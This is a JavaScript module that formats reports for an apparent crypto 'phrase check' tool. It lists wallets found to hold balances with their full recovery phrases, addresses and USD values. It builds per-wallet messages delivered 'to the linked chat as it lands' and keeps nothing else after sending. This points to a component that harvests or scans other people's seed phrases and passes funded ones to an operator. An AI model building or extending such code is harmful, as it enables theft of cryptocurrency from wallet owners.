import { formatUsd } from "@/lib/format";

function compactAmount(value) {
  if (!value) return "0";
  if (value < 0.0001) return value.toPrecision(4);
  if (value < 1) return value.toFixed(6).replace(/0+$/, "");
  return new Intl.NumberFormat("en-US", { maximumFractionDigits: value < 1000 ? 4 : 2 }).format(value);
}

export function reportFileName() {
  return `phrase-check-${new Date().toISOString().slice(0, 10)}.txt`;
}

/** The .txt body: a header, then one block per checked wallet — funded ones marked. */
export function buildReport(all, funded) {
  const total = funded.reduce((sum, slot) => sum + slot.total, 0);
  const lines = [
    "HELIX — PHRASE CHECK",
    `Phrases checked: ${all.length}`,
    `With balance: ${funded.length}`,
    `Balance found: ${formatUsd(total)}`,
    `Generated: ${new Date().toISOString().replace("T", " ").slice(0, 16)} UTC`,
    "",
  ];

  all.forEach((slot, index) => {
    lines.push(
      `${index + 1}. ${slot.words}-word wallet${
        slot.account > 0 ? ` · account ${slot.account + 1}` : ""
      } · ${
        slot.total > 0 ? `FUNDED · ${formatUsd(slot.total)}` : "no funds"
      }`,
    );
    lines.push(`   ${slot.phrase}`);
    for (const item of slot.funded || []) {
      lines.push(`   - ${item.symbol}: ${compactAmount(item.balance)} (${formatUsd(item.value)})`);
    }
    lines.push("");
  });

  return lines.join("\n");
}

/**
 * The report that is delivered: funded wallets only, each with the coins it
 * holds and the addresses those coins sit on. Everything else the scan touched
 * stays out of it, because nothing else is kept once it has been sent.
 */
export function buildFundedReport(funded) {
  const total = funded.reduce((sum, slot) => sum + slot.total, 0);
  const lines = [
    "HELIX — FUNDED WALLETS",
    `With balance: ${funded.length}`,
    `Balance found: ${formatUsd(total)}`,
    `Generated: ${new Date().toISOString().replace("T", " ").slice(0, 16)} UTC`,
    "",
  ];

  funded.forEach((slot, index) => {
    lines.push(
      `${index + 1}. ${formatUsd(slot.total)} · line ${slot.line}${
        slot.account > 0 ? ` · account ${slot.account + 1}` : ""
      } · ${slot.words}-word phrase`,
    );
    for (const item of slot.funded || []) {
      lines.push(`   - ${item.symbol}: ${compactAmount(item.balance)} (${formatUsd(item.value)})`);
    }
    const chains = new Set((slot.funded || []).map((item) => item.chain));
    for (const [chain, address] of Object.entries(slot.addresses || {})) {
      if (chains.has(chain)) lines.push(`   ${chain}: ${Array.isArray(address) ? address.join(", ") : address}`);
    }
    lines.push(`   phrase: ${slot.phrase}`);
    lines.push("");
  });

  return lines.join("\n");
}

/** One message for a single funded wallet, delivered to the linked chat as it lands. */
export function buildWalletMessage(slot) {
  const lines = [
    `FUNDED WALLET · ${formatUsd(slot.total)}`,
    `Line ${slot.line}${slot.account > 0 ? ` · account ${slot.account + 1}` : ""} · ${slot.words}-word phrase`,
    "",
  ];
  for (const item of slot.funded || []) {
    lines.push(`${item.symbol}: ${compactAmount(item.balance)} — ${formatUsd(item.value)}`);
  }
  const fundedChains = new Set((slot.funded || []).map((item) => item.chain));
  const addresses = Object.entries(slot.addresses || {}).filter(([chain]) => fundedChains.has(chain));
  if (addresses.length) {
    lines.push("", "Addresses:");
    for (const [chain, address] of addresses) {
      lines.push(`${chain}: ${Array.isArray(address) ? address.join(", ") : address}`);
    }
  }
  lines.push("", "Phrase:", slot.phrase);
  return lines.join("\n");
}

export function buildCaption(all, funded, scanned) {
  const total = funded.reduce((sum, slot) => sum + slot.total, 0);
  return [
    "Helix — phrase check",
    `Scanned ${scanned.toLocaleString("en-US")} phrases · ${all.length} wallets checked`,
    `With balance ${funded.length} · ${formatUsd(total)}`,
  ].join("\n");
}